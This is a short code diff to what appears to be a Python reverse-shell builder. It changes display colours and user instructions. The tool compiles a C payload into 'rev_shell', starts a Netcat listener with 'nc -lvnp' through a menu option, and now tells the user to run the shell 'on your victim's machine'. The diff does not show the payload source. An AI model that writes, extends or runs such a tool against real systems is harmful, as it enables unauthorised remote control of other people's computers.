@@ -332,7 +332,7 @@ def main():
     with Live(console=console, refresh_per_second=1) as live:
         for section in sections:
             displayed_sections.append(section)
-            text = Text("\n".join(displayed_sections), justify="center", style="bold green")
+            text = Text("\n".join(displayed_sections), justify="center", style="bold red")
             live.update(text)
             time.sleep(0.5)
     
@@ -375,14 +375,14 @@ def main():
             display_green("C file 'shell_payload.c' compiled to 'rev_shell'")
             display_green(separator)
             display_yellow("To use the reverse shell:")
-            display_yellow("1. Start a Netcat listener: nc -lvnp [port]")
-            display_yellow("2. Run the compiled reverse shell: ./rev_shell")
+            display_yellow("1. Start a Netcat listener by selecting the option 2")
+            display_yellow("2. Run the compiled reverse shell on your victim's machine: ./rev_shell")
         
         elif choice == '2':
             if latest_port is not None:
                 subprocess.run(['nc', '-lvnp', str(latest_port)])
       
-                display_yellow("No port information available. Please provide an IP and port first.")
+                display_red("No port information available. Please provide an IP and port first.")
         
         elif choice == '3':
             view_logs()
